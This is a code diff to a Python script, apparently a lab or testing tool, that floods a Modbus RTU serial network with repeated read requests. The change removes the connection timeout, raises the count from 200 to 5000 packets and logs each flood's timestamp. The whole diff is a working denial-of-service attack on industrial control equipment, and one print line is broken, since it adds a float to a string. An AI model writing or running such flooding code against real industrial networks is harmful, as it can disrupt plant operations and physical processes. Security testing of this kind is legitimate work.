@@ -7,12 +7,12 @@ import random
 
 
 def begin_flood():
-    client = ModbusClient(method='rtu', port='/dev/ttyUSB0', timeout=20,stopbits = 1, bytesize = 8, parity = 'N', baudrate= 9600)
+    client = ModbusClient(method='rtu', port='/dev/ttyUSB0',stopbits = 1, bytesize = 8, parity = 'N', baudrate= 9600)
     client.connect()
-    for i in range(200):
+    for i in range(5000):
         client.read_input_registers(1, 21, unit=20)
 
-    print("Modbus Network Flood Attempted - sent 200 packets \n")
+    print("Modbus Network Flood Attempted - sent 5000 packets \n")
     print("Time Stamp: " + time.time())
     with open("modbus_floods.txt", "a") as f:  # open the file in append mode
         f.write(str(time.time()) + "\n")  # write the current timestamp to the file then a new line
